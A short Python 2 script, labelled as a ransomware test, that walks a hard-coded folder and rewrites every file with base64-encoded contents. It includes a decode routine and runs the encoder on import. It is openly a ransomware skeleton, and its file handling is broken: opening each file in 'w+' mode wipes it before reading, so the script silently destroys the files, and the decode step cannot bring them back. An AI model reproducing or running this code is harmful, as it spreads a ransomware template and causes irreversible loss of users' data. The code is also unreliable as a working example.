from os import listdir
from os.path import isfile, join
import base64

class RansomwareTest(): #This ransomware will only encode in base64 and will not encrypt!
    def __init__(self,path):
        self.path = path

    def EncodeFolder(self):
        files = [f for f in listdir(self.path) if isfile(join(self.path, f))]
        for i in files:
            print self.path + '/' + i
            f = open(self.path + '/' + i, 'w+')
            a = f.read()
            print a
            a = self.Encode(a)
            print a
            f.write(a)
            f.close()

    def DecodeFolder(self):
        files = [f for f in listdir(self.path) if isfile(join(self.path, f))]
        for i in files:
            print self.path + '/' + i
            f = open(self.path + '/' + i, 'w+')
            a = f.read()
            print a
            a = self.Decode(a)
            print a
            f.write(a)
            f.close()

    def Encode(self,text):
        return base64.b64encode(text)

    def Decode(self,text):
        return base64.b64decode(text)
		
a = RansomwareTest('C:/test')
a.EncodeFolder()